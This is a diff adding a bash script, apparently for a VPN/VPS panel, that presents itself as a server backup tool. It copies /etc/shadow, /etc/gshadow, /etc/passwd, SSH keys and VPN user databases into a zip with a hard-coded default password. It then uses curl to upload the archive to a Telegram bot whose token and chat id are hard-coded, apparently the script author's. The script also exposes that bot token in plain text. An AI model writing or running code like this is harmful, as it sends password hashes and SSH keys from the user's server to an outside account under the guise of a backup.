@@ -1,0 +1,96 @@
+#!/bin/bash
+# COLOR VALIDATION
+clear
+RED='\033[0;31m'
+NC='\033[0m'
+gray="\e[1;30m"
+Blue="\033[0;34m"
+green='\033[0;32m'
+grenbo="\e[92;1m"
+YELL='\033[0;33m'
+BG_BLU="\033[44;1m" # BG BIRU
+# Getting
+MYIP=$(curl -sS ipv4.icanhazip.com)
+IP=$(wget -qO- icanhazip.com)
+dateToday=$(date +"%Y-%m-%d")
+Name=$(curl https://raw.githubusercontent.com/arivpnstores/izin/main/ip | grep $MYIP | awk '{print $2}')
+clear
+botBackup() {
+    switch=on
+    bottoken=6226300152:AAE8Qv37sXKaIDn80q7cVkSbvYBWeCUlE9E
+    adminid=1962241851
+    echo -e "[ ${green}INFO${NC} ] Create password "
+	if [[ -z $InputPass ]]; then
+	InputPass="Ari123Ok"
+	fi
+	sleep 1
+    echo -e "[ ${green}INFO${NC} ] • VPS Data Backup... "
+    sleep 1
+    echo -e "[ ${green}INFO${NC} ] • Directory Created... "
+    mkdir /root/backup &>/dev/null
+    sleep 1
+    echo -e "[ ${green}INFO${NC} ] • VPS Data Backup Start Now... "
+    echo -e "[ ${green}INFO${NC} ] • Please Wait , Backup In Process Now... "
+    sleep 1
+	cp /etc/passwd backup/ &>/dev/null
+	echo -e "[ ${green}INFO${NC} ] • Backup passwd data..."
+	sleep 1
+	cp /etc/group backup/ &>/dev/null
+	echo -e "[ ${green}INFO${NC} ] • Backup group data..."
+	sleep 1
+	cp /etc/shadow backup/ &>/dev/null
+	echo -e "[ ${green}INFO${NC} ] • Backup shadow data..."
+	sleep 1
+	cp /etc/gshadow backup/ &>/dev/null
+	echo -e "[ ${green}INFO${NC} ] • Backup gshadow data..."
+	sleep 1
+cp /etc/crontab backup/ &>/dev/null
+cp /etc/vmess/.vmess.db backup/ &>/dev/null
+cp /etc/ssh/.ssh.db backup/ &>/dev/null
+cp /etc/vless/.vless.db backup/ &>/dev/null
+cp /etc/trojan/.trojan.db backup/ &>/dev/null
+cp /etc/bot/.bot.db backup/ &>/dev/null
+cp -r /etc/kyt/limit backup/ &>/dev/null
+cp -r /etc/limit backup/qt/ &>/dev/null
+cp -r /etc/ssh backup/ssh &>/dev/null
+cp -r /etc/slowdns backup/slowdns &>/dev/null
+cp -r /var/lib/kyt/ backup/kyt  &>/dev/null
+cp -r /etc/xray backup/xray &>/dev/null 
+cp -r /var/www/html/ backup/html &>/dev/null
+cp -r /etc/banner.txt backup/banner.txt &>/dev/null
+cp -r /etc/kyt/limit backup/limit &>/dev/null
+cp -r /etc/vmess backup/vmess &>/dev/null
+cp -r /etc/trojan backup/trojan &>/dev/null
+cp -r /etc/vless backup/vless &>/dev/null
+cp -r /etc/shadowsock backup/shadowsock &>/dev/null
+cd /root &>/dev/null
+zip -rP "$InputPass" "$Name-$IP-$dateToday.zip" backup >/dev/null 2>&1
+
+    echo -e "[ ${green}INFO${NC} ] • Sending Via Bot... "
+    curl -Ss --request POST \
+        --url "https://api.telegram.org/bot${bottoken}/sendDocument?chat_id=${adminid}&caption=Here Your Backup Today : ${dateToday}" \
+        --header 'content-type: multipart/form-data' \
+        --form document=@"/root/$Name-$IP-$dateToday.zip" >/root/t1
+
+    fileId=$(grep -o '"file_id":"[^"]*' /root/t1 | grep -o '[^"]*$')
+
+    curl -Ss --request GET \
+        --url "https://api.telegram.org/bot${bottoken}/getfile?file_id=${fileId}" >/root/t1
+
+    filePath=$(grep -o '"file_path":"[^"]'* /root/t1 | grep -o '[^"]*$')
+
+    curl -Ss --request GET \
+        --url "https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=${adminid}&text=File ID   : <code>${fileId}</code>&parse_mode=html" &>/dev/null
+    curl -Ss --request GET \
+        --url "https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=${adminid}&text=File Path : <code>${filePath}</code>&parse_mode=html" &>/dev/null
+
+    echo -e "[ ${green}INFO${NC} ] • Completed... "
+
+    rm -rf /root/backup
+    rm -r /root/$Name-$IP-$dateToday.zip
+    rm -f /root/t1
+    read -n 1 -s -r -p "Press any key to back on menu"
+    menu
+}
+    echo -e "${green}SETUP SUDAH DI SETTING OLEH ADMIN${NC}"
+    botBackup
